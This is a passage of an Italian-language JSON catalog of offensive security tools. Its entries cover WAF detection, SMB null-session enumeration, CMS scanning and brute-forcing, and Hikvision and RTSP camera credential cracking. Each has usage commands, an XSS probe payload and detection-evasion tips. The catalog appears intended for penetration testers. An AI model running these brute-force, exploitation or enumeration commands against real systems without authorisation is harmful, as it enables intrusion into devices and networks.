    "installation": "GitHub",
    "repo": "https://github.com/Ekultek/WhatWaf",
    "desc": "Tool di detection avanzata per Web Application Firewall (WAF) che suggerisce tecniche di bypass e tamper payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>WhatWaf</strong> rileva la presenza di firewall web analizzando le risposte a payload malevoli e confrontandole con firme note. La sua caratteristica distintiva è la capacità di suggerire script di \"tampering\" (modifica del payload) per tentare di aggirare le protezioni identificate, sfruttando encoding o tecniche di offuscamento specifiche per quel vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Fingerprinting:</strong> Riconosce oltre 70 WAF diversi (Cloudflare, AWS, Imperva, ModSecurity) tramite analisi header e comportamenti di blocco.</p><p><strong>Bypass Suggestions:</strong> Tenta di inviare payload modificati (es. URL encoding, case variation) per vedere se il WAF li lascia passare, indicando quali tecniche funzionano.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Analisi target\n./whatwaf -u https://target.com\n\n# Tentativo bypass attivo con payload XSS\n./whatwaf -u https://target.com --pl \"<script>alert(1)</script>\" --ra</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Assessment:</strong> Prima di lanciare scanner pesanti, capire quale WAF protegge il sito permette di configurare gli scanner con i giusti delay o script di evasione per non essere bannati subito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Invia payload di attacco evidenti. Il WAF sicuramente loggerà e bloccherà i tentativi iniziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "paramspider",
    "name": "paramspider",
    "version": "1.0.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/devanshbatham/ParamSpider",
    "desc": "Tool di ricognizione passiva che estrae parametri URL da archivi web (Wayback Machine) per scoprire vulnerabilità nascoste.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>ParamSpider</strong> è uno strumento di ricognizione focalizzato sulla scoperta di parametri URL potenzialmente vulnerabili senza interagire direttamente con il target (passive recon). Interroga enormi archivi storici come la Wayback Machine e Common Crawl per recuperare vecchi URL associati al dominio bersaglio. Questo permette di identificare parametri \"dimenticati\" (es. <code>?debug=true</code>, <code>?admin_token=</code>) che sono vettori ideali per XSS, SQL Injection o SSRF, spesso sfuggiti ai crawler attivi moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mining da Archivi Web:</strong> Non esegue crawling attivo, ma estrae milioni di URL storici dagli archivi pubblici. Questo approccio è invisibile ai sistemi di difesa del target (WAF/SIEM) e rivela endpoint dismessi ma ancora attivi.</p><p><strong>Parameter Cleaning:</strong> Include algoritmi per pulire i risultati, rimuovendo duplicati e URL \"spazzatura\" (es. immagini .jpg, .css) per fornire una lista pulita di parametri testabili (fuzzing ready).</p><p><strong>Supporto Nested Parameters:</strong> Capace di identificare strutture complesse di URL e parametri annidati, spesso usati in applicazioni enterprise legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3. L'output viene salvato automaticamente in un file txt.</p><pre><code># Scansione base di un dominio\npython3 paramspider.py -d target.com\n\n# Scansione con esclusione di estensioni e output custom\npython3 paramspider.py -d target.com --exclude php,aspx --output params.txt --level high</code></pre><p>I risultati sono formattati per essere passati direttamente a tool di fuzzing come GF (Grep Fuzz) o Nuclei.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale nel <strong>Bug Bounty Hunting</strong> su target molto grandi o \"hardenizzati\". Quando la homepage è sicura, ParamSpider trova quella vecchia pagina di marketing del 2018 con un parametro <code>?redirect=</code> vulnerabile a Open Redirect o XSS. In <strong>Web Application Assessment</strong>, aiuta a mappare la superficie d'attacco storica che non è linkata nell'applicazione attuale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Zero traffico verso il target durante la fase di discovery (totalmente passiva). Il traffico viene generato solo quando si testano i parametri trovati.</p><p><strong>Mitigazioni:</strong> Nessuna necessaria per la fase di discovery. Attenzione quando si inizia il probing attivo degli URL trovati (molti potrebbero essere 404).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Params_Discovery"
    ],
    "notes": null
  },
  {
    "id": "smb-enum",
    "name": "SMB-enum",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Metodologia e raccolta tool (smbclient, rpcclient, nmap) per enumerazione profonda del servizio SMB: share, utenti, gruppi e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SMB-enum</strong> non è un singolo software ma rappresenta l'insieme delle tecniche e tool standard utilizzati per interrogare il servizio SMB/RPC (porta 445/139). Questa fase è critica nei test interni perché SMB spesso espone informazioni preziose (user enumeration via RID cycling, null sessions) o accessi diretti (share scrivibili) che permettono di ottenere un foothold senza exploit complessi.</p><br><hr><h4 class=\"rt-purple\">Tecniche e Tool</h4><p><strong>Null Session & Guest Access:</strong> Verifica se è possibile connettersi senza credenziali (<code>rpcclient -U \"\"</code> o <code>smbclient -N</code>). Se abilitato, permette di enumerare utenti e password policy.</p><p><strong>RID Cycling:</strong> Tecnica che interroga ciclicamente gli ID relativi (RID) degli account per mappare username e gruppi, efficace anche se la lista utenti è protetta.</p><p><strong>Share Enumeration:</strong> Scansione dei permessi su cartelle condivise (SYSVOL, NETLOGON, profili) per trovare file sensibili o punti di scrittura.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si basa su utility Linux standard o script Nmap.</p><pre><code># Listare share con smbclient (Null session)\nsmbclient -L //192.168.1.10 -N\n\n# Enumerazione utenti via rpcclient\nrpcclient -U \"\" 192.168.1.10 -c \"enumdomusers\"\n\n# Nmap script automation\nnmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery target_ip\n\n# Tool automatizzato alternativo: enum4linux-ng\nenum4linux-ng -A 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>È il primo passo in un <strong>Internal Pentest</strong> dopo il discovery degli host. Spesso rivela account \"Guest\" attivi o share configurate male (\"Everyone: Full Control\") che offrono accesso immediato. L'enumerazione della Password Policy via SMB è fondamentale per calibrare i successivi attacchi di password spraying senza bloccare account.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Tentativi di Null Session e scansioni Nmap sono loggati e rilevati da IDS. Il RID Cycling genera molti errori se non mirato.</p><p><strong>Mitigazioni:</strong> Usare traffico mirato. Se si possiedono credenziali valide, usarle sempre invece di tentare accessi anonimi che sono più sospetti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "postman",
    "name": "Postman",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://www.postman.com/downloads/",
    "desc": "Piattaforma di collaborazione per API development, usata in security per testare, fuzzare e manipolare endpoint REST/GraphQL/SOAP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sebbene nato per sviluppatori, <strong>Postman</strong> è inestimabile per l'API Security Testing. Permette di costruire collezioni di richieste HTTP complesse, gestire autenticazioni (OAuth2, JWT, Bearer) e scriptare test automatici. È l'interfaccia ideale per interagire con API che non hanno un frontend web, permettendo di testare IDOR, Mass Assignment e Broken Authentication.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Collection Runner:</strong> Esegue sequenze di richieste automatiche, utile per fuzzing leggero o per riprodurre catene di exploit logici.</p><p><strong>Environment Variables:</strong> Gestisce token dinamici e variabili, facilitando il testing su ambienti diversi (dev/prod) senza riscrivere le richieste.</p><p><strong>Proxy Capture:</strong> Può catturare traffico dal browser o da mobile app per costruire automaticamente la collezione API da testare.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GUI Desktop o Web. Importare una specifica Swagger/OpenAPI se disponibile.</p><pre><code># Workflow Security\n1. Importare Swagger file (target.yaml)\n2. Configurare Authorization (es. Bearer Token)\n3. Modificare ID nell'endpoint GET /users/{id} per testare BOLA\n4. Inviare payload JSON malformati per testare validazione</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Pentest:</strong> Quando si testa un backend REST, Postman offre un controllo granulare sui verbi HTTP (PUT, DELETE, PATCH) e sugli header, spesso necessario per trovare vuln che il browser non mostra.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Non è uno scanner automatico di vulnerabilità (anche se esistono plugin), richiede input manuale intelligente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "API"
    ],
    "notes": null
  },
  {
    "id": "cmseek-v-1-1-3",
    "name": "CMSeeK",
    "version": "1.1.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Tuhinshubhra/CMSeeK",
    "desc": "Scanner avanzato per rilevamento e analisi di oltre 180 CMS, con detection versione, plugin e vulnerabilità note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CMSeek</strong> è uno dei tool di fingerprinting più completi per Content Management Systems. Non si limita a WordPress o Joomla, ma supporta oltre 180 piattaforme diverse (Drupal, Magento, Wix, ecc.). Esegue una \"Deep Scan\" per identificare la versione esatta del CMS, enumerare gli utenti, trovare plugin installati e suggerire exploit pubblici noti per la configurazione rilevata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Deep Scan & Version Detection:</strong> Analizza codice sorgente, file statici, header HTTP e file di errore per determinare la versione precisa del CMS, fondamentale per mappare le CVE.</p><p><strong>Modularità:</strong> Include moduli specifici per WordPress (user enum, plugin enumeration) e Joomla (file backup finding), offrendo funzionalità simili a WPScan ma in un tool unificato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Interfaccia a riga di comando interattiva o diretta.</p><pre><code># Scansione standard URL\npython3 cmseek.py -u https://target.com\n\n# Scansione batch da lista siti\npython3 cmseek.py -l sites.txt --batch</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fase preliminare di <strong>Web Assessment</strong>. Quando ci si trova di fronte a un sito web sconosciuto, CMSeek identifica rapidamente la tecnologia sottostante, permettendo di scegliere poi tool di exploit specifici (es. usare WPScan solo se è confermato WordPress).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni sono attive e generano traffico riconoscibile. I WAF moderni bloccano spesso le richieste di fingerprinting se non offuscate (User-Agent).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cmsmap",
    "name": "CMSmap",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/dionach/CMSmap",
    "desc": "Scanner di vulnerabilità Python per CMS (WordPress, Joomla, Drupal, Moodle) con rilevamento plugin, temi e brute-force.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CMSmap</strong> è uno strumento centralizzato per l'audit di sicurezza dei Content Management System più diffusi. Automatizza il processo di fingerprinting per identificare versioni, plugin e temi installati, correlandoli con database di exploit pubblici (Exploit-DB) per segnalare vulnerabilità note. Integra anche moduli per attacchi di forza bruta e post-exploitation basilare.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-CMS Support:</strong> Rileva e scansiona automaticamente WordPress, Joomla, Drupal e Moodle, adattando le tecniche di enumerazione alla piattaforma target senza bisogno di configurazione manuale.</p><p><strong>Vulnerability Mapping:</strong> Scarica e mantiene aggiornato un database locale di exploit. Quando rileva un plugin o una versione specifica, controlla se esistono PoC (Proof of Concept) disponibili, fornendo link diretti alle vulnerabilità.</p><p><strong>Deep Enumeration:</strong> Esegue l'enumerazione degli utenti, scan dei file di backup, e directory listing. Include un modulo per il cracking delle password via dizionario contro i pannelli di login amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'esecuzione standard richiede solo l'URL del target. Il tool riconosce automaticamente il tipo di CMS.</p><pre><code># Scansione completa automatica\ncmsmap.py https://target-blog.com\n\n# Scansione WordPress con utente specifico per brute-force\ncmsmap.py https://wp-site.com -u admin -p passwords.txt\n\n# Aggiornamento database exploit\ncmsmap.py -U PC</code></pre><p>Per evitare falsi positivi o scansioni troppo lente, è possibile disabilitare il check degli exploit con <code>--noedb</code>.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Ideale nella fase di <strong>Web Application Assessment</strong> quando si incontrano installazioni standard di CMS. Permette di identificare rapidamente \"low hanging fruits\" come plugin non aggiornati da anni o configurazioni di default, prima di passare a test manuali più approfonditi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le scansioni complete (Full Scan) generano migliaia di richieste HTTP in breve tempo, facilmente bloccabili da WAF e plugin di sicurezza (es. Wordfence). Il brute-force triggera immediatamente alert di login falliti.</p><p><strong>Mitigazioni:</strong> Usare user-agent custom. Evitare il brute-force se non strettamente necessario. Preferire scansioni passive o mirate se il WAF è attivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "General"
    ],
    "notes": null
  },
  {
    "id": "joomlascan",
    "name": "JoomlaScan",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/drego85/JoomlaScan",
    "desc": "Scanner di vulnerabilità per Joomla: rileva versione, componenti installati, firewall e misconfigurazioni note.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>JoomlaScan</strong> è uno scanner di sicurezza specializzato per il CMS Joomla, l'equivalente funzionale di WPScan per il mondo WordPress. È progettato per eseguire reconnaissance approfondita su installazioni Joomla, enumerando la versione del core attraverso analisi di file XML manifest, header HTTP e pattern specifici, identificando componenti ed estensioni di terze parti installati, e verificando l'esistenza di exploit noti per le versioni rilevate. Offre una panoramica completa della postura di sicurezza del CMS target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Method Version Detection:</strong> utilizza metodi euristici multipli per determinare la versione precisa del core Joomla analizzando file manifest XML, language files, changelog, README e meta tag generator, funzionando anche quando l'informazione è offuscata o rimossa.</p><p><strong>Component &amp; Extension Enumeration:</strong> scansiona path noti di componenti popolari (com_users, com_content, com_media, com_contact) e estensioni third-party, mappando la superficie d'attacco completa inclusi plugin, moduli e template installati.</p><p><strong>Vulnerability Correlation:</strong> correla versioni di core e componenti rilevati con database di vulnerabilità note, segnalando CVE applicabili e fornendo riferimenti a exploit pubblici per facilitare la fase di exploitation.</p><p><strong>Firewall &amp; WAF Detection:</strong> identifica la presenza di estensioni di sicurezza come RSFirewall, AdminTools o WAF esterni che potrebbero bloccare tentativi di exploitation, permettendo di adattare la strategia di attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base di un sito Joomla\njoomlascan -u https://target.com\n\n# Enumerazione componenti aggressiva\njoomlascan -u https://target.com -ec\n\n# Con output verboso per debugging\njoomlascan -u https://target.com -v\n\n# Scansione attraverso proxy\njoomlascan -u https://target.com --proxy http://127.0.0.1:8080\n\n# Output in formato JSON\njoomlascan -u https://target.com -o json\n\n# Scan con timeout custom\njoomlascan -u https://target.com --timeout 30</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Joomla Security Assessment</strong>, condurre valutazione completa della sicurezza di installazioni Joomla identificando versioni obsolete del core, componenti vulnerabili e misconfigurazioni comuni.</p><p>Per <strong>Pre-Exploitation Reconnaissance</strong>, raccogliere intelligence critica prima di lanciare exploit, determinando se il target usa Joomla 3.x, 4.x o versioni precedenti e quali componenti sono installati.</p><p>Per <strong>Vulnerability Validation</strong>, verificare se vulnerabilità note sono applicabili al target specifico basandosi su versioni esatte rilevate dal tool.</p><p>Per <strong>Bug Bounty Hunting</strong>, identificare rapidamente installazioni Joomla vulnerabili durante reconnaissance su scope di programmi bug bounty.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> lo scanner esegue molte richieste GET a path specifici (file manifest, changelog, componenti) generando numerosi 404 nei log del server facilmente identificabili come pattern di scanning. WAF e plugin di sicurezza Joomla possono bloccare o rate-limitare le richieste. User-Agent default è riconoscibile. Usare throttling, proxy rotation e custom User-Agent per ridurre detection durante operazioni stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "CMS",
      "Joomla"
    ],
    "notes": null
  },
  {
    "id": "katana-linux-amd64",
    "name": "katana_linux_amd64",
    "version": "1.2.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/projectdiscovery/katana",
    "desc": "Crawler e spider web di nuova generazione per discovery approfondita di endpoint, file JS e parametri nascosti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Katana (di ProjectDiscovery) è un crawler web progettato per l'era delle Single Page Application (SPA). A differenza dei crawler tradizionali, utilizza un motore headless (controllando Chrome) per renderizzare ed eseguire JavaScript, scoprendo link ed endpoint che vengono generati dinamicamente lato client e che sfuggirebbero a una semplice analisi HTML statica.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Crawling:</strong> Esegue il codice JS della pagina per trovare link XHR/Fetch, essenziale per app React/Vue/Angular.</p><p><strong>Input Parsing:</strong> Estrae non solo URL, ma anche form, parametri e file JavaScript, alimentando pipeline di fuzzing o vulnerability scanning.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione standard o via pipe.</p><pre><code># Crawling base\n./katana -u https://target.com\n\n# Crawling con headless mode e estrazione JS\n./katana -u https://target.com -jc -headless -d 2</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Modern Web Pentest:</strong> Per mappare correttamente la superficie d'attacco di applicazioni web moderne dove gran parte del routing avviene lato client. Ottimo per alimentare tool come Nuclei o ParamSpider.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il crawling headless è lento e genera molto traffico. Comporta l'esecuzione di script di tracciamento sul target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "findsploit-2-0",
    "name": "Findsploit",
    "version": "2.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/1N3/Findsploit",
    "desc": "Utility CLI per ricerca rapida di exploit in database locali (Exploit-DB) e online (PacketStorm, NVD) simultaneamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Findsploit</strong> è uno script wrapper che potenzia la ricerca di exploit. A differenza di <code>searchsploit</code> che cerca solo nel database locale di Exploit-DB, Findsploit interroga simultaneamente repository online multipli, inclusi PacketStorm, NVD e CVE details. È progettato per trovare PoC recenti che potrebbero non essere ancora stati indicizzati nel database locale di Kali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Ricerca Ibrida:</strong> Combina risultati offline (veloci) con query online (aggiornate), offrendo una copertura completa.</p><p><strong>Download Diretto:</strong> Facilita il download del codice sorgente dell'exploit nella directory di lavoro corrente per analisi o compilazione immediata.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sintassi semplice da riga di comando.</p><pre><code># Ricerca generica per servizio\nfindsploit wordpress 5.0\n\n# Ricerca specifica CVE\nfindsploit CVE-2024-1234</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la fase di <strong>Vulnerability Analysis</strong>, quando uno scanner riporta una CVE ma Metasploit non ha un modulo. Findsploit aiuta a trovare rapidamente script PoC Python o C da adattare manualmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Scaricare ed eseguire exploit da internet comporta rischi. Analizzare sempre il codice prima dell'esecuzione per evitare malware o danni non intenzionali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "cameradar-5-0-4",
    "name": "cameradar",
    "version": "5.0.4",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ullaakut/cameradar",
    "desc": "Scanner specializzato per discovery e accesso a telecamere RTSP di sorveglianza, con bruteforce di credenziali e route.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cameradar</strong> è uno strumento offensivo progettato per l'accesso non autorizzato a flussi di videosorveglianza RTSP (Real Time Streaming Protocol). Scansiona intere subnet alla ricerca di porte RTSP aperte (default 554, 8554) e tenta di determinare il modello della telecamera e il percorso corretto dello stream. Successivamente, esegue attacchi a dizionario per indovinare le credenziali di accesso, verificando se lo stream è accessibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Route Discovery:</strong> Le telecamere usano percorsi diversi (es. <code>/live</code>, <code>/ch0</code>, <code>/h264</code>). Cameradar include un database di migliaia di path noti per identificare quello corretto anche senza credenziali.</p><p><strong>Credential Bruteforcing:</strong> Tenta l'accesso usando liste di credenziali di default specifiche per produttori di telecamere (Hikvision, Dahua, Axis), riducendo il tempo rispetto a un bruteforce generico.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Si utilizza specificando target e porte.</p><pre><code># Scansione subnet con output JSON\n./cameradar -t 192.168.1.0/24 -p 554,8554 --json-output results.json\n\n# Bruteforce su target specifico con wordlist custom\n./cameradar -t 10.0.0.50 -u user.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nei <strong>Physical Security Assessment</strong>, dimostrare di poter accedere alle telecamere interne permette di mappare i movimenti delle guardie o vedere codici digitati sui tastierini. Spesso le telecamere sono su VLAN separate ma accessibili per misconfigurazione di routing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Molto rumoroso. Tentativi di connessione RTSP falliti riempiono i log degli NVR. Può causare il blocco temporaneo del flusso video su dispositivi hardware datati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "hikpwn",
    "name": "HikPwn",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/4n4nk3/HikPwn",
    "desc": "Tool scanner ed exploit per telecamere Hikvision vulnerabili a bypass autenticazione (CVE-2017-7921) e command injection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>HikPwn</strong> è uno strumento offensivo mirato ai dispositivi di videosorveglianza Hikvision. Automatizza la rilevazione di vulnerabilità critiche come la CVE-2017-7921, che permette di bypassare l'autenticazione modificando l'URL, e la CVE-2021-36260 per l'esecuzione remota di codice (RCE). Il tool può estrarre snapshot, configurazioni utente e decifrare password direttamente dalla memoria del dispositivo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Auth Bypass:</strong> Verifica se il dispositivo soffre dell'improper authentication token bug, permettendo di scaricare la lista utenti senza password.</p><p><strong>Config Decryptor:</strong> Include un modulo per scaricare e decifrare il file di configurazione (contenente credenziali in chiaro) dai modelli vulnerabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script Python standalone.</p><pre><code># Scansione range IP\npython3 hikpwn.py -t 192.168.1.0/24\n\n# Exploit target specifico per estrarre utenti\npython3 hikpwn.py -t 192.168.1.50 --exploit users</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>IoT Security Assessment:</strong> Le telecamere sono spesso il punto di ingresso più debole in una rete fisica. HikPwn permette di dimostrare come un attaccante possa prendere il controllo della videosorveglianza senza conoscere la password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste malformate agli endpoint <code>/System/deviceInfo</code> o <code>/Security/users</code> sono loggate. L'RCE può causare riavvii del dispositivo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-routes-wordlist",
    "name": "routes_wordlist.txt",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Wordlist specializzata contenente path di API, endpoint e route di framework moderni (Rails, Django, Spring) per discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>A differenza delle wordlist generiche di directory, <code>routes.txt</code> (spesso associata a Jhaddix o SecLists) è focalizzata sulle \"rotte\" applicative. Include pattern tipici di API REST (<code>/api/v1/user</code>), endpoint di debug di framework (<code>/actuator/heapdump</code>), e route amministrative che non corrispondono a file fisici ma a controller logici. È densa e ottimizzata per applicazioni moderne.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Context Aware:</strong> Contiene endpoint specifici per Spring Boot, Ruby on Rails, Node.js.</p><p><strong>High Value:</strong> Privilegia percorsi che portano a PII, configurazioni o takeover (es. <code>/console</code>, <code>/graphql</code>).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Con Gobuster o Ffuf.</p><pre><code>ffuf -u https://api.target.com/FUZZ -w routes_wordlist.txt -mc 200</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>API Discovery:</strong> Quando si testa un'applicazione Single Page o Mobile backend, questa lista trova gli endpoint nascosti che non sono linkati nel frontend.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Molto grande. Usare filtri di status code per non annegare nei falsi positivi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-authgrinder",
    "name": "rtsp_authgrinder",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tektengu/rtsp_authgrinder",
    "desc": "Bruteforcer puro per protocollo RTSP, focalizzato sulla velocità di test delle credenziali su servizi già identificati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rtsp_authgrinder</strong> è uno strumento dedicato esclusivamente alla fase di \"Cracking\". A differenza degli scanner che cercano host, questo tool assume che il target (IP:Porta) sia già noto e si concentra sul martellare il servizio di autenticazione. È scritto per essere leggero e veloce, supportando wordlist personalizzate per utenti e password, ed è spesso utilizzato in catena con altri tool di discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Itera combinazioni user:pass contro il servizio RTSP.</p><p><strong>Error Handling:</strong> Gestisce intelligentemente i timeout e le disconnessioni tipiche dei dispositivi IoT instabili, riprovando le credenziali se la connessione cade per motivi di rete e non per auth fallita.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Esecuzione da riga di comando.</p><pre><code># Attacco base\n./rtsp_authgrinder -t 192.168.1.10 -p 554 -U users.txt -P pass.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Penetration Testing mirato:</strong> Quando si trova una telecamera critica (es. sala server) e si vuole tentare un attacco esaustivo per accedervi. La gestione degli errori lo rende preferibile a Hydra su connessioni instabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera log di \"Login Failed\" massivi sul dispositivo. Può causare il blocco temporaneo dell'account admin se il dispositivo implementa lockout (raro su IoT economici).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "RTSP"
    ],
    "notes": null
  },
  {
    "id": "rtsp-crack-1-0-3",
    "name": "rtsp_crack",
    "version": "1.0.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "",
    "desc": "Tool semplice per testare credenziali di default e comuni su stream RTSP, utile per verifiche rapide di misconfigurazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rtsp_crack</strong> è uno script di verifica rapida (\"Check & Go\"). Invece di eseguire un bruteforce esaustivo, utilizza un database interno o ridotto delle credenziali di fabbrica più comuni per i principali produttori di telecamere (Axis, Panasonic, Samsung, etc.). È progettato per la velocità: verifica se il dispositivo è lasciato con le impostazioni di default in pochi secondi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Default Credential Check:</strong> Prova una lista curata di \"Top 20\" credenziali IoT.</p><p><strong>Stream Validation:</strong> Non si limita al login, ma prova a negoziare lo stream (DESCRIBE/SETUP) per confermare che il video sia effettivamente accessibile e non solo l'interfaccia di gestione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Script bash o python.</p><pre><code># Check rapido su target\npython3 rtsp_crack.py 192.168.1.50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Vulnerability Assessment:</strong> Durante un audit di conformità, permette di verificare rapidamente se le policy di cambio password al primo avvio sono state rispettate dagli installatori.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Meno efficace contro password custom, ma molto silenzioso (pochi tentativi) rispetto a un bruteforcer completo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
